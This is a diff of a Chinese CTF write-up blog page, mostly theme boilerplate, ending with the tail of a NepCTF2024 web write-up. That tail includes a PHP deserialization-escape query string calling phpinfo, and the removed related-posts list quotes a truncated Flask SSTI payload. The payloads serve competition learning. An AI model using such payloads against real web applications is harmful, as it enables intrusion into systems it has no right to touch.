-							<a href="/2025/01/14/SUCTF2025/" title="SUCTF 2025 WEB部分wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/SUCTF2025/SUCTF2025.jpg" alt="SUCTF 2025 WEB部分wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/" title="2024鹏城杯web全wp">
-								2024鹏城杯web全wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								十一月 9日, 2024				
-							</p>
-							<p class="relate-post-content">
-								python口算-pcb2024123456789101112131415161718192021222324import requestsimport reurl = &quot;http://192.168.18.28&quot;...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/" title="2024鹏城杯web全wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/5.jpg" alt="2024鹏城杯web全wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/" title="强网杯2024">
-								强网杯2024			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								十一月 3日, 2024				
-							</p>
-							<p class="relate-post-content">
-								PyBlockly黑名单过滤了所有符号，只能在print里用字母和数字，
-1234if check_for_blacklisted_symbols(block[&#x27;fields&#x27;][&#x27;TEXT&#x27;]...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/" title="强网杯2024">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/qwb2024/qwb2024.png" alt="强网杯2024"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/10/07/SCTF2024/" title="SCTF2024 ezRender">
-								SCTF2024 ezRender			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								十月 7日, 2024				
-							</p>
-							<p class="relate-post-content">
-								ezRender这道题主要是成为admin，要成为admin就要伪造cookie，要伪造cookie就要获取jwt密钥。
-jwt密钥生成逻辑：
-123456789101112131415161718192021import timec...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/10/07/SCTF2024/" title="SCTF2024 ezRender">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/SCTF2024/SCTF2024.jpg" alt="SCTF2024 ezRender"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/09/21/ByteCTF2024%E5%A4%A7%E5%B8%88%E8%B5%9B/" title="ByteCTF2024大师赛web部分wp">
-								ByteCTF2024大师赛web部分wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								九月 21日, 2024				
-							</p>
-							<p class="relate-post-content">
-								ezobj源码：
-12345678910111213141516171819&lt;?phpini_set(&quot;display_errors&quot;, &quot;On&quot;);include_once(&quot;...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/09/21/ByteCTF2024%E5%A4%A7%E5%B8%88%E8%B5%9B/" title="ByteCTF2024大师赛web部分wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/2024bytectf/bytectf.png" alt="ByteCTF2024大师赛web部分wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFweb%E5%85%A8%E9%A2%98%E8%A7%A3/" title="第四届长城杯web全题解">
-								第四届长城杯web全题解			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								九月 8日, 2024				
-							</p>
-							<p class="relate-post-content">
-								WEB
-SQLUS
-
-
-
-猜测账户是admin密码是任意一个字符
-登录进去后头像那边，可以上传文件，但是文件名里不能有p，尝试传入.htaccess然后传入一个txt当做php执行。
-
-
-
-在头像前端看到了上传路径
-
-
-flag没有权...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFweb%E5%85%A8%E9%A2%98%E8%A7%A3/" title="第四届长城杯web全题解">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/第四届长城杯/ccb.png" alt="第四届长城杯web全题解"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" title="2024第七届巅峰极客部分wp">
-								2024第七届巅峰极客部分wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								八月 25日, 2024				
-							</p>
-							<p class="relate-post-content">
-								GoldenHornKing源码给了是很明显的ssti，在&#x2F;calc路由里传参calc_req，黑名单是不能有：数字、百分号、非ascii之外的字符。最烦的是这个access，原本是False，可以不用管，但是一旦成功执行一...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" title="2024第七届巅峰极客部分wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/dfjk/dfjk.png" alt="2024第七届巅峰极客部分wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="2024春秋杯部分wp">
-								2024春秋杯部分wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								七月 6日, 2024				
-							</p>
-							<p class="relate-post-content">
-								brother打开题目是?name&#x3D;hello，还回显了hello，看一下后台语言和框架
-
-一眼ssti模版注入，
-1?name=&#123;&#123;g.pop.__globals__.__builtins__.__im...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="2024春秋杯部分wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/2024春秋杯/2024春秋杯.png" alt="2024春秋杯部分wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛全wp">
-								PolarCTF2024夏季个人挑战赛全wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								六月 10日, 2024				
-							</p>
-							<p class="relate-post-content">
-								扫扫看不用扫，猜测是flag.php
-
-
-flag{094c9cc14068a7d18ccd0dd3606e532f}
-
-debudaoflag在cookie里：
-
-
-flag{72077a55w312584wb1aaa88888cd...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛全wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/PolarCTF2024春季个人挑战赛wp/polarctf.png" alt="PolarCTF2024夏季个人挑战赛全wp"/>
-							</a>
-						</div>
-					</li>												
-			
-		</ul>
-	
-</div>	
-				</div>
-				<div class="investment-content-list">
-					<div class="layout-comment">
-
-	
-
-		
-
-			<!-- gitalk comment -->
-			<!-- show gitalk comment -->
-<div id="gitalk-container"></div>
-
-<!-- gitalk`s css & js -->
-<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-<link rel="stylesheet" href="/css/comment.css">
-<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
-<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-
-<script type="text/javascript">
-
-	(function gitalkComment(){
-		//Thanks O-R
-		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
-		//去除尾部匹配正则数组的字符串  
-		//Remove redundant characters
-		String.prototype.trimEnd = function(regStr) {
-			let result = this;
-			if(regStr == undefined || regStr == null || regStr == "") {
-				return result;
-			}
-			let array = regStr.split(',');
-
-			if(array.length > 0) {
-
-				let c = array.shift(), 
-					str = this,
-					i = str.length,
-					rg = new RegExp(c),
-					matchArr = str.match(rg);
-
-				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
-					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
-						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
-						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
-						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
-						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
-						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
-						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
-						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
-					matchStr = matchStr + '$';
-					result = str.replace(new RegExp(matchStr), "");
-				}
-
-				if(array.length > 0) {
-					return result.trimEnd(array.join())
-				} else {
-					return result;
-				}
-			}
-		};
-
-		//Create gitalk
-		let gitalk = new Gitalk({
-			clientID: '333--',
-			clientSecret: '333--',
-			//id: window.location.pathname,
-			//id: decodeURI(window.location.pathname),
-			//id: (window.location.pathname).split("/").pop().substring(0, 49),
-			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
-			repo: 'annie-gitalk',
-			owner: 'Sariay',
-			admin: 'Sariay',
-			distractionFreeMode: 'true',
-		})
-		gitalk.render('gitalk-container');		
-	})();
-</script>
-
-		
-		
-	
-
-</div>
-				</div>
-				<div class="investment-content-list">
-					<div class="layout-share">
-	
-	
-
-		
-			
-			<!-- socialShare share -->
-			<div class="social-share"></div>
-
-<!--  css & js -->
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
-<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
-			
-		
-		
-	
-</div>
-
-
-				</div>
-			</div>	
-		</div>
-	</div>
-</div>
-
-<!-- show math formula -->
-
-
-
-	 
-	
-<script src="/plugin/clipboard/clipboard.js"></script>
-
-	<script>
-		// Copy code !
-	    function preprocessing() {
-	        $("#article-content .highlight").each(function() {
-	            $(this).wrap('<div id="post-code"></div>');
-	        })
-
-	        $("#article-content #post-code").each(function() {
-	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
-	        })
-
-	        $("#article-content .copy-nav").each(function() {
-	            let languageClass = $(this).next().attr('class'),
-	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
-
-	            $(this).find('.code-language').text(language);
-	            $(this).append('<span class="copy-btn icon-paste"></span>');
-	        });
-	    }
-
-		function copy() {
-		    $('#article-content #post-code').each(function(i) {
-		        let codeCopyId = 'codeCopy-' + i;
-
-		        let codeNode = $(this).find('.code'),
-		            copyButton = $(this).find('.copy-btn');
-
-		        codeNode.attr('id', codeCopyId);
-		        copyButton.attr('data-clipboard-target-id', codeCopyId);
-		    })
-   
-			let clipboard = new ClipboardJS('.copy-btn', {
-					target: function(trigger) {
-						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
-					}
-		      	});
-
-			//pure js
-			function showTooltip(elem, msg) {		   
-				elem.setAttribute('aria-label', msg);
-				elem.setAttribute('class', 'copy-btn icon-clipboard1');
-				setTimeout(function() {
-					elem.setAttribute('class', 'copy-btn icon-paste');
-				}, 2000);
-			}
-
-			clipboard.on('success', function(e) {
-			    e.clearSelection();
-			    console.info('Action:', e.action);		   
-			    console.info('Trigger:', e.trigger);
-			    showTooltip(e.trigger, 'Copied!');   
-			});
-			
-			clipboard.on('error', function(e) {
-			    console.error('Action:', e.action);
-			    console.error('Trigger:', e.trigger);
-			});
-		}
-		
-		(function copyCode(){
-			if ($('.layout-post').length) {
-			    preprocessing();
-			    copy();
-			} 
-		})();
-	</script>
-
-
-
-
-
-
-<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
-
-
-<script src="/plugin/fancybox/jquery.fancybox.js"></script>
-
-
-<script type="text/javascript">
-	(function gallerySet(){
-		let titleID = $('.article-title a'),
-			imageID = $('.article-content img'),
-			videoID = $('.article-content video');
-		
-		let postTitle = titleID.text() ? titleID.text() : "No post title!";
-		
-		imageID.each(function() {
-			let imgPath = $(this).attr('src'),
-				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
-		
-			//给每个匹配的<img>元素打包, 即添加父元素<a>
-			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
-		});
-		
-		videoID.each(function() {
-			let videoPath = $(this).attr('src');
-		
-			//给每个匹配的<img>元素打包, 即添加父元素<a>
-			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
-		});
-		
-		//TODO：支持html5 video
-
-		if($('#layout-post').length) {
-			$('[data-fancybox="gallery"]').fancybox({
-				loop: true,
-				buttons: [
-					"zoom",
-					"share",
-					"slideShow",
-					"fullScreen",
-					//"download",
-					"thumbs",
-					"close"
-				],
-				protect: true
-			});
-		}
-	})();
-</script>
-		</main>
-
-		<!--footer-->
-		<footer>
-	<div id="navigation-show">
-		<ul id="global-nav">
-	
-		<li class="menu-home">
-			<a href="/" class="menu-item-home" target="_blank">主页</a>
-		</li>
-		
-	
-		<li class="menu-archive">
-			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
-		</li>
-		
-	
-		<li class="menu-categories">
-			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
-		</li>
-		
-	
-		<li class="menu-tags">
-			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
-		</li>
-		
-	
-		<li class="menu-Friends!">
-			<a href="/friends" class="menu-item-Friends!" target="_blank">Friends!</a>
-		</li>
-		
-	
-		<li class="menu-gallery">
-			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
-		</li>
-		
-	
-
-	
-</ul>
-	</div>
-
-	<div class="copyright">
-		<p>
-			 
-				&copy;2024 - 2025, content by Infernity. All Rights Reserved.
-			
-			
-				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
-			
-		</p>
-		<p>
-			
-
-	<!-- busuanzi -->
-	<!-- busuanzi -->
-
-		
-	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-	
-
-		<span id="busuanzi_container_page_pv">
-	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
-		</span>
-
-	
-
-
-
-
-			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
-			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
-		</p>
-	</div>		
-</footer>
-		
-	<!-- Local or hitokoto! -->
-
-	
-<script src="/plugin/motto/motto.js"></script>
-
-	
-	<script type="text/javascript">
-		(function motto(){
-			let mottoText = getMingYanContent().split('</br> - </br>'),
-			
-			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
-			
-			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
-			
-			mottoTextContent = mottoTextContent.trim().substring(0, 100);
-		
-			$("#motto-content").html( mottoTextContent);
-			$("#motto-author").html( mottoTextFrom  );
-		})();	
-	</script>	
-
-
-
-<!-- love effect -->
-
-	
-<script src="/plugin/love/love.js"></script>
-
-
-
-<!-- back to top -->
-
-	<div id="totop">
-	<span class="icon-circle-up"></span>
-</div>
-
-
-
-<!-- site analysis -->
-
-
-	<!-- site-analysis -->
-	
-	
-	
-	
-	
- 
-
-<!-- leancloud -->
-
-
-	<!-- leancloud -->
-	<!--
-	时间：2018-11-27
-	描述：
-		文章访问量：visitors
-		文章喜欢量：likes	
-		文章排行榜：topNPost
-		其他得说明：
-			01-Cookie相关的函数 
-				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
-			02-visitors相关的函数 
-				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
-				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
-			03-topNPost相关的函数
-				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
-			04-likes相关的函数，
-				参考了01 & 02进行简单的设计与实现
--->
-
-
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?c=%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%0<span class="hljs-number">0</span>%00<span class="hljs-string">&quot;;s:3:&quot;</span>str<span class="hljs-string">&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;s:7:&quot;</span>phpinfo<span class="hljs-string">&quot;;&#125;&#125;&amp;nep1=%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0&amp;nep=NepCTNep</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/nepctf2024/QQ_1724743182982.png" srcset="/img/loading.gif" lazyload alt="QQ_1724743182982"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
   
-<script src="/plugin/leancloud/av-min.js"></script>
-<script src="/js/leancloud-count.js"></script>
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/WPs/" class="category-chain-item">WPs</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/WPs/" class="print-no-link">#WPs</a>
+      
+    </div>
+  
+</div>
 
 
-	
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>NepCTF2024部分web</div>
+      <div>http://example.com/2024/08/25/NepCTF2024部分web/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Infernity</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月25日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFweb%E5%85%A8%E9%A2%98%E8%A7%A3/" title="第四届长城杯web全题解">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">第四届长城杯web全题解</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" title="2024第七届巅峰极客部分wp">
+                        <span class="hidden-mobile">2024第七届巅峰极客部分wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
 
   
 
 
 
-<script src="/plugin/chinese/chinese.js"></script>
-<script src="/plugin/imagelazyloader/yall.min.js"></script>
-<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
-<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
-<script src="/plugin/resizediv/resizediv.js"></script>
-<script src="/js/main.js"></script>
+  
 
-	</body>	
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
 </html>
